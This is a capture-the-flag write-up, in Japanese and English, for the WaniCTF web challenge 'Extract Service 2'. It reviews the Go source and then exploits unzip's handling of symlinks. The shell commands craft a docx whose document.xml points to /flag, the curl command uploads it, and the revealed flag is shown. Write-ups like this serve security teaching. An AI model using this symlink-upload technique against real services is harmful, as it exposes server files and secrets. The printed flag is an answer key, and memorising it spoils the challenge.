# Extract Service 2:Web:191pts
Extract Service 1は脆弱性があったみたいなので修正しました！ 配布ファイルの`sample`フォルダにお試し用のドキュメントファイルがあるのでぜひ使ってください。  
サーバーの`/flag`ファイルには秘密の情報が書いてあるけど大丈夫だよね...?  
We have fixed Extract Service 1 as it had vulnerabilities! Please feel free to use the sample document file in the "sample" folder of the distribution file for trial purposes.  
The secret information is written in the `/flag` file on the server, but it should be safe, right...?  
[https://extract2-web.wanictf.org](https://extract2-web.wanictf.org/)  

[web-extract2.zip](web-extract2.zip)  

# Solution
[Extract Service 1](../Extract_Service_1/)の脆弱性を修正したもののようだ。  
おそらくパストラバーサルが修正されていると思われるが、確認のためソースを読む。  
```go
~~~
		// patched
		extractTarget := ""
		targetParam := c.PostForm("target")
		if targetParam == "" {
			c.HTML(http.StatusOK, "index.html", gin.H{
				"result": "Error : target is required",
			})
			return
		}
		if targetParam == "docx" {
			extractTarget = "word/document.xml"
		} else if targetParam == "xlsx" {
			extractTarget = "xl/sharedStrings.xml"
		} else if targetParam == "pptx" {
			extractTarget = "ppt/slides/slide1.xml"
		} else {
			c.HTML(http.StatusOK, "index.html", gin.H{
				"result": "Error : target is invalid",
			})
			return
		}

~~~
```
任意のファイルを読み取ることができなくなっている。  
ここで、docxの展開部分を見てやると以下の通りであった。  
```go
~~~
func ExtractFile(zipPath, baseDir string) error {
	if err := exec.Command("unzip", zipPath, "-d", baseDir).Run(); err != nil {
		return err
	}
	return nil
}
~~~
```
やはり`unzip`して中身の`word/document.xml`を読んでいるようだ。  
ここでzipファイルにシンボリックリンクを含ませることができることを思い出す。  
つまり、`word/document.xml`を`/flag.txt`へのシンボリックリンクとしておけば読み取ってくれそうである。  
以下の通り加工したdocxを作成して投げる。  
```bash
$ mkdir word
$ ln -s /flag word/document.xml
$ ls -al word/
total 0
drwxrwxrwx 1 ---- ---- 4096 May  5 00:00 .
drwxrwxrwx 1 ---- ---- 4096 May  5 00:00 ..
lrwxrwxrwx 1 ---- ----    5 May  5 00:00 document.xml -> /flag
$ zip -ry hack.docx word/
  adding: word/ (stored 0%)
  adding: word/document.xml (stored 0%)
$ curl -X POST https://extract2-web.wanictf.org/ -F file=@hack.docx -F 'target=docx'
<!DOCTYPE html>
~~~
  <section class="container px-5">
    <div class="mt-5">
      <p>FLAG{4x7ract_i3_br0k3n_by_3ymb01ic_1ink_fi1e}</p>
    </div>
  </section>
~~~
</html>
```
flagが読み取れた。  

## FLAG{4x7ract_i3_br0k3n_by_3ymb01ic_1ink_fi1e}